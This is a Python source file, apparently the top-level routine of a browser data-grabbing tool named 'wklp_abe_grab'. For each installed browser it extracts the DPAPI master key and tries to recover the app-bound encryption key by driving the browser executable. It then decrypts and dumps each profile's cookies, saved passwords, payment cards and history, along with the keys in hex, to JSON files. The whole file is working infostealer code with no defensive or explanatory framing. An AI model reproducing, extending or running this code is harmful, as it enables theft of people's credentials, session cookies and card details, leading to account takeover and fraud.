import json
import os
from pathlib import Path

from wklp_abe_grab.browsers import BROWSERS, SKIP, find_edge_exe
from wklp_abe_grab.crypto import read_local_state
from wklp_abe_grab.debug_loop import get_app_bound
from wklp_abe_grab.extractors import scan_profile


def grab_all(out_dir="grabbed"):
    os.makedirs(out_dir, exist_ok=True)
    summary = {}

    for name, cfg in BROWSERS.items():
        ud = cfg["data"]
        if not ud.exists():
            continue

        print("\n[%s] %s" % (name, ud))

        ls = ud / "Local State"
        mk = read_local_state(str(ls)) if ls.exists() else None
        if mk:
            print("[%s] master key %s" % (name, mk.hex()))

        abk = None
        edge = cfg["edge"]
        use_ab = cfg.get("app_bound", True)

        exe_paths = list(cfg["exe"])
        if edge and not exe_paths:
            f = find_edge_exe()
            if f:
                exe_paths = [Path(f)]
        exe = next((str(p) for p in exe_paths if Path(p).exists()), None)

        if use_ab and exe:
            print("[%s] app-bound extraction (oscrypt)" % name)
            abk = get_app_bound(exe, cfg["dlls"], cfg["kill"],
                                is_edge=edge, timeout=90,
                                extra_args=cfg.get("args"),
                                browser_name=name)
            if abk:
                print("[%s] app-bound key %s" % (name, abk.hex()))
            else:
                print("[%s] extraction failed, dpapi only" % name)
        elif not use_ab:
            print("[%s] dpapi only (no app-bound)" % name)

        profiles = {}
        for pd in sorted(ud.iterdir()):
            if not pd.is_dir() or pd.name in SKIP:
                continue
            d = scan_profile(pd, mk, abk)
            total = sum(len(v) for v in d.values())
            if total == 0:
                continue
            profiles[pd.name] = d
            print("  [%s/%s] cookies=%d passwords=%d cards=%d history=%d" % (
                name, pd.name, len(d["cookies"]), len(d["passwords"]),
                len(d["cards"]), len(d["history"])))

        result = {
            "app_bound_key": abk.hex() if abk else None,
            "master_key": mk.hex() if mk else None,
            "profiles": profiles,
        }
        summary[name] = result

        out = os.path.join(out_dir, "%s.json" % name)
        with open(out, "w", encoding="utf-8") as f:
            json.dump(result, f, indent=2, ensure_ascii=False,
                      default=lambda x: x.hex()
                      if isinstance(x, bytes) else str(x))
        print("[%s] -> %s" % (name, out))

    return summary